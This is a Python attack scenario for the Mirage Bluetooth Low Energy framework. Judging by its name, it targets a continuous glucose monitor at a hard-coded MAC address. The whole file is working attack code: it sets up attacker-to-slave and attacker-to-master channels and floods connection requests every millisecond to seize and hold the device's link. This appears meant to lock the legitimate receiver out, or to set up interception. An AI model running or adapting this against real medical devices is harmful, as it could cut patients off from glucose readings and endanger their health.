from mirage.core import scenario
from mirage.libs import io, ble
import time

class cgm(scenario.Scenario):
    def onStart(self):
        # Setup communication channels
        self.a2sEmitter = self.module.a2sEmitter  # Attacker to Slave emitter
        self.a2sReceiver = self.module.a2sReceiver  # Attacker to Slave receiver
        self.a2mEmitter = self.module.a2mEmitter  # Attacker to Master emitter
        self.a2mReceiver = self.module.a2mReceiver  # Attacker to Master receiver

        # Configure target device and operational parameters
        self.target_mac = "5C:53:B4:00:E9:6B"
        self.flood_interval = 0.001  # Reduce interval to speed up reconnection attempts

        self.keepConnected()
        return True

    def keepConnected(self):
        while True:
            if self.connectToDevice(self.target_mac):
                io.info(f"Connected to {self.target_mac}")
                self.maintainConnection()
            else:
                io.fail(f"Failed to connect to {self.target_mac}")
                time.sleep(self.flood_interval)  # Short delay before retrying

    def connectToDevice(self, mac_address):
        connection_request = ble.BLEConnect(mac_address)
        self.a2sEmitter.sendp(connection_request)
        time.sleep(0.01)  # Reduced wait time for faster connection attempts
        return self.a2sReceiver.isConnected()

    def maintainConnection(self):
        # Check connection status less frequently to reduce processing load
        while self.isDeviceConnected(self.target_mac):
            time.sleep(0.1)  # Reduced check rate to decrease system load

        io.info(f"Disconnected from {self.target_mac}. Reconnecting...")

    def isDeviceConnected(self, mac_address):
        # Verify if the device is still connected
        return self.a2sReceiver.isConnected()

    def onEnd(self):
        return True
